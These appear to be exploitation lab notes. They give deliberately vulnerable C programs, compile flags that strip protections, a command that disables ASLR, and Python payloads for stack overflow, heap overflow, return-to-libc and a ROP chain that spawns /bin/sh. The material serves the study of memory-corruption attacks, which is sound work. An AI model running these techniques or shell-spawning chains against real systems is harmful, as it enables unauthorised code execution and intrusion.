Stack based buffer overflow
------------------------------------------------------------
#include<stdio.h>
#include<string.h>
#include<stdlib.h>
void func(const char *msg)
{
      char buff[16];
      strcpy(buff,msg);
}

void hack()
{
  printf("\n You have been hacked..HAHAHAHAHA");
  exit(1);
}

int main (int argc, char*argv[])
{
   func(argv[1]);
   return 0;
}
--------------------------------------------------
For disabling ASLR

echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
--------------------------------------------------------------
Compiling program without protections

gcc -m32 -mpreferred-stack-boundary=2 -g -fno-stack-protector -z execstack -no-pie -o output input.c
-----------------------------------------------------------------------
Payload
---------
#!/usr/bin/python
import struct
import sys
payload=b"A"*72+struct.pack("<I",0x80491ae)
sys.stdout.buffer.write(payload)

Heap based buffer overflow
------------------------------------
#include<stdlib.h>
#include<unistd.h>
#include<string.h>
#include<stdio.h>
#include<sys/types.h>
struct data
{
   char name[64];
};

struct fp
{
  void(*fp)();
};

void dummy()
{
 printf("\n You are hacked");
}

void legit()
{
 printf("\n You are safe");
}

int main (int argc, char*argv[])
{
   struct data *d;
   struct fp *f;
   d=malloc(sizeof(struct data));
   f=malloc(sizeof(struct fp));
   f->fp=legit;
   printf("\n data is at %p, fp is at %p\n", d,f);
   strcpy(d->name, argv[1]);
   f->fp();
}

----------------------------------------
gcc -m32 -mpreferred-stack-boundary=2 -g -fno-stack-protector -z execstack -no-pie -o output input.c
-------------------------------------------------------
Return to libc
------------------------------------------------------
#include <stdio.h>
#include <string.h>
int main(int argc,char *argv[]) {
char buf[10];
strcpy(buf,argv[1]);
return 0;
}
------------------------------------------------------------------
gcc -ggdb -m32 -mpreferred-stack-boundary=2 -fno-stack-protector -
znoexecstack rtol.c -o rtol

strings -a -t x /usr/lib32/libc.so.6 | grep "/bin/sh"

gdb-peda----> vmmap

p system

p exit
------------------------------------------------------------------
Final Payload
--------------------------------------
#!/usr/bin/python
import struct
import sys

payload  = b"A" * 18
payload += struct.pack("<I", 0xf7db67f0)  # system()
payload += struct.pack("<I", 0xf7da30c0)  # exit()
payload += struct.pack("<I", 0xf7f2be52)  # "/bin/sh base=f7d63000+offset 1c8e52"

sys.stdout.buffer.write(payload)
------------------------------------------------------------------
ROP
-------------------------------------------------------------------
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>

int main(int argc, char *argv[]) {
    char buf[64];

    if (argc < 2) {
        printf("Usage: %s <input_file>\n", argv[0]);
        return 1;
    }

    int fd = open(argv[1], O_RDONLY);
    if (fd < 0) {
        perror("open");
        return 1;
    }

    read(fd, buf, 200);   // overflow
    close(fd);

    return 0;
}
-----------------------------------------------------------------------
gcc -ggdb -m32 -mpreferred-stack-boundary=2 -fno-stack-protector -
znoexecstack rop.c -o ropc

Data Section -->readelf -S ropc | grep .data
Gadgets
Popping EAX-->ROPgadget --binary /usr/lib32/libc.so.6 | grep -E " : pop eax ; ret$"
Popping EBX--> ROPgadget --binary /usr/lib32/libc.so.6 | grep -E " : pop ebx ; ret$" 
Popping ECX and EDX --> ROPgadget --binary /usr/lib32/libc.so.6 | grep -E " : pop ecx ; pop edx ; ret$"
 
Popping EDX --> ROPgadget --binary /usr/lib32/libc.so.6 | grep -E " : pop edx ; ret$"

Int 0x80 ---> ROPgadget --binary /usr/lib32/libc.so.6 | grep -E " : int 0x80$"

mov dword ptr [edx],eax;ret -->ROPgadget --binary /usr/lib32/libc.so.6 | grep -E "mov dword ptr \[edx\], eax ; ret"

---------------------------------------------------------------------
Final payload python----
--------------------------------------------------------------------
from struct import pack

offset = 76
libc = 0xf7d63000	# from vmmap
data = 0x0804c010   # correct writable memory

def addr(x): return pack("<I", libc + x)

# gadgets
POP_EAX = 0x0012fbd1
POP_EBX = 0x0002569d
POP_ECX_EDX = 0x0003d28b
POP_EDX = 0x0003d28c
MOV_EDX_EAX = 0x0008d0ae
INT80 = 0x0003b41c

payload = b"A"*offset

# -------------------------
# write "/bin"
# -------------------------
payload += addr(POP_EDX)
payload += pack("<I", data)

payload += addr(POP_EAX)
payload += pack("<I", 0x6e69622f)   # "/bin"

payload += addr(MOV_EDX_EAX)

# -------------------------
# write "//sh"
# -------------------------
payload += addr(POP_EDX)
payload += pack("<I", data+4)

payload += addr(POP_EAX)
payload += pack("<I", 0x68732f2f)   # "//sh"

payload += addr(MOV_EDX_EAX)

# -------------------------
# null terminate
# -------------------------
payload += addr(POP_EDX)
payload += pack("<I", data+8)

payload += addr(POP_EAX)
payload += pack("<I", 0)

payload += addr(MOV_EDX_EAX)

# -------------------------
# set registers
# -------------------------
# ebx = "/bin/sh"
payload += addr(POP_EBX)
payload += pack("<I", data)

# ecx = 0, edx = 0
payload += addr(POP_ECX_EDX)
payload += pack("<I", 0)
payload += pack("<I", 0)

# eax = 11
payload += addr(POP_EAX)
payload += pack("<I", 11)

# syscall
payload += addr(INT80)

# write payload
open("p1.txt","wb").write(payload)


_________________________________________________________________________-

